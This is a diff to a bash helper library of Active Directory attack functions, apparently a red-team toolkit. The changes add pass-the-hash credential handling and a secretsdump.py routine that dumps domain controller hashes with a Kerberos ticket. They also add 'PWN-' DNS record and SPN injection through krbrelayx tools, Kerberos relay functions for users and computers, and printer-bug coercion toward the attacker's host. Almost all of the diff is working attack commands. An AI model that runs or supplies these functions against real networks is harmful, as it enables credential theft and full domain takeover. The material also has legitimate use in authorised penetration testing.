@@ -14,7 +14,7 @@
 # https://github.com/Gallopsled/pwntools.git
 # https://github.com/fox-it/BloodHound.py.git
 # https://github.com/wshepherd0010/network.git
-# googlesearch
+# apt-get install googlesearch
 
 # SECTION: Global environment variables:
 # DESCRIPTION: Environment variables used in helper functions -- DOMAIN, USER, PASSWORD, DCIP, C2SERVER, and IMPLANT.
@@ -128,7 +128,11 @@ function setUserByHash(){
     export DOMAIN=$2;
     setVariables;
     export HASH=$3;
-    export HASHES=":${HASH}";
+    if [[ "$HASH" == *":"* ]]; then
+        export HASHES=$HASH;
+    else
+        export HASHES=":${HASH}";
+    fi
     export PASSWORD=$HASHES;
     export DCIP=$2;
     return;
@@ -142,7 +146,11 @@ function setLocalUserByHash(){
     setVariables;
     export DOMAINUSER=$USER;
     export HASH=$2;
-    export HASHES=":${HASH}";
+    if [[ "$HASH" == *":"* ]]; then
+        export HASHES=$HASH;
+    else
+        export HASHES=":${HASH}";
+    fi
     export PASSWORD=$HASHES;
     export DOMAIN="";
     export DCIP="";
@@ -328,7 +336,7 @@ function dumpSIDs(){
 # SECTION: Authenticated reconnaissance function helpers:
 
 function adDNSDump(){
-    # DESCRIPTION: Perform adidnsdump of zones using PASSWORD (hash or plaintext).
+    # DESCRIPTION: Perform ADIDNS dump of zones using domain user or computer hash or plaintext.
     # ARGUMENT: TARGET.
     TARGET=$1;
     proxychains \
@@ -956,6 +964,17 @@ function dumpADConnect(){
     return;
 }
 
+function dumpDCOnly(){
+    # DESCRIPTION: Dump DC hashes only using KRBCCACHE TGT.
+    # ARGUMENT: DCFQDN.
+    DCFQDN=$1;
+    proxychains \
+            secretsdump.py \
+            -outputfile $DCFQDN \
+            -k $DCFQDN -just-dc;
+    return;
+}
+
 function dumpSAM(){
     # DESCRIPTION: Dump SAM and LSA secrets on remote host.
     # ARGUMENT: TARGET.
@@ -1106,103 +1125,127 @@ function getST(){
 }
 
 function addDNS(){
-    # DESCRIPTION: Add DNS on target domain.
-    # ARGUMENT: DNS, TARGETIP.
-    DNS=$1;
-    TARGETIP=$2;
+    # DESCRIPTION: Add DNS on target domain  using computer or user password or hashes.
+    # ARGUMENT: IPADDRESS, SPNHOST, SERVER.
+    IPADDRESS=$1;
+    SPNHOST=$2;
+    SERVER=$3;
     proxychains \
     /opt/krbrelayx/dnstool.py \
     -u "${DOMAIN}\\${USER}" \
     -p $PASSWORD \
-    -r $DNS -a add -d $TARGETIP;
+    -r "PWN-${SPNHOST}" -a add -d $IPADDRESS $SERVER;
     return;
 }
 
 function queryDNS(){
-    # DESCRIPTION: Query DNS on target domain.
-    # ARGUMENT: DNS, TARGETIP.
-    DNS=$1;
-    TARGETIP=$2;
+    # DESCRIPTION: Query DNS on target domain using computer or user password or hashes.
+    # ARGUMENT: IPADDRESS, SPNHOST, SERVER.
+    IPADDRESS=$1;
+    SPNHOST=$2;
+    SERVER=$3;
     proxychains \
     /opt/krbrelayx/dnstool.py \
     -u "${DOMAIN}\\${USER}" \
     -p $PASSWORD \
-    -r $DNS -a query -d $TARGETIP;
+    -r "PWN-${SPNHOST}" -a query -d $IPADDRESS $SERVER;
     return;
 }
 
 function removeDNS(){
-    # DESCRIPTION: Remove DNS on target system.
-    # ARGUMENT: DNS, TARGETIP.
-    DNS=$1;
-    TARGETIP=$2;
+    # DESCRIPTION: Remove DNS on target system using DOMAIN computer or user password or hashes.
+    # ARGUMENT: IPADDRESS, SPNHOST, SERVER.
+    IPADDRESS=$1;
+    SPNHOST=$2;
+    SERVER=$3;
     proxychains \
     /opt/krbrelayx/dnstool.py \
     -u "${DOMAIN}\\${USER}" \
     -p $PASSWORD \
-    -r $DNS -a remove -d $TARGETIP;
+    -r "PWN-${SPNHOST}" -a remove -d $IPADDRESS $SERVER;
     return;
 }
 
 function removeSPN(){
-    # DESCRIPTION: Remove SPN from target system.
-    # ARGUMENT: SPN, SERVER.
-    SPN=$1;
+    # DESCRIPTION: Remove SPN from target system using DOMAIN computer or user password or hashes.
+    # ARGUMENT: SPNHOST, SERVER.
+    SPNHOST=$1;
     SERVER=$2;
     proxychains \
     /opt/krbrelayx/addspn.py \
     -u "${DOMAIN}\\${USER}" \
     -p $PASSWORD \
-    -s $SPN -r $SERVER;
+    -s "HOST/PWN-${SPNHOST}" \
+    -r "ldap://${SERVER}";
     return;
 }
 
 function querySPN(){
-    # DESCRIPTION: Query SPN on target system.
-    # ARGUMENT: SPN, SERVER.
-    SPN=$1;
+    # DESCRIPTION: Query SPN on target system using DOMAIN computer or user password or hashes.
+    # ARGUMENT: SPNHOST, SERVER.
+    SPNHOST=$1;
     SERVER=$2;
     proxychains \
     /opt/krbrelayx/addspn.py \
     -u "${DOMAIN}\\${USER}" \
     -p $PASSWORD \
-    -s $SPN -q $SERVER;
+    -s "HOST/PWN-${SPNHOST}" \
+    -q "ldap://${SERVER}";
     return;
 }
 
 function addSPN(){
-    # DESCRIPTION: Add SPN on target system.
-    # ARGUMENT: SPN, SERVER.
-    SPN=$1;
+    # DESCRIPTION: Add SPN on target system using computer or user password or hashes.
+    # ARGUMENT: SPNHOST, SERVER.
+    SPNHOST=$1;
     SERVER=$2;
     proxychains \
     /opt/krbrelayx/addspn.py \
     -u "${DOMAIN}\\${USER}" \
     -p $PASSWORD \
-    -s $SPN $SERVER;
+    -s "HOST/PWN-${SPNHOST}" \
+    --additional "ldap://${SERVER}";
     return;
 }
 
-function krbRelay(){
-    # DESCRIPTION: KRP relay for target AD user.
-    # ARGUMENT: TDOMAINUSER, TPASSWORD.
-    TDOMAINUSER=$1;
-    TPASSWORD=$2;
+function krbRelayUser(){
+    # DESCRIPTION: KRP relay for target AD user with uppercase DOMAIN.
+    # ARGUMENT: TDOMAIN, TUSER, TPASSWORD.
+    TDOMAIN=$1;
+    TUSER=$2;
+    TPASSWORD=$3;
     python /opt/krbrelayx/krbrelayx.py \
-    --krbsalt "${TDOMAINUSER}" \
+    --krbsalt "${TDOMAIN}${TUSER}" \
     --krbpass $TPASSWORD;
     return;
 }
 
+function krbRelayComputer(){
+    # DESCRIPTION: KRP relay for target AD computer using AES-256 hash.
+    # ARGUMENT: AES256HASH.
+    AES256HASH=$1;
+    python /opt/krbrelayx/krbrelayx.py \
+    -aesKey $AES256HASH;
+    return;
+}
+
+function krbExportTGT(){
+    # DESCRIPTION: Export the TGT CCACHE file after Kerberos relay.
+    # ARGUMENT: CACHE
+    CACHE=$1;
+    export KRB5CCNAME=${CACHE};
+    return;
+}
+
 function printerRelay(){
-    # DESCRIPTION: Print spool MSRPC on target system.
-    # ARGUMENT: TARGET, ATTACKER.
-    TARGET=$1;
-    ATTACKER=$2;
+    # DESCRIPTION: Print spool MSRPC on target system FQDN of the DC or server.
+    # ARGUMENT: DCFQDN, SPNHOST.
+    DCFQDN=$1;
+    SPNHOST=$2;
     proxychains \
     /opt/krbrelayx/printerbug.py \
-    -no-pass -hashes $HASHES \
-    ${DOMAINUSER}@${TARGET} $ATTACKER;
+    -hashes $HASHES \
+    ${DOMAINUSER}@${DCFQDN} "PWN-${SPNHOST}";
     return;
 }
 
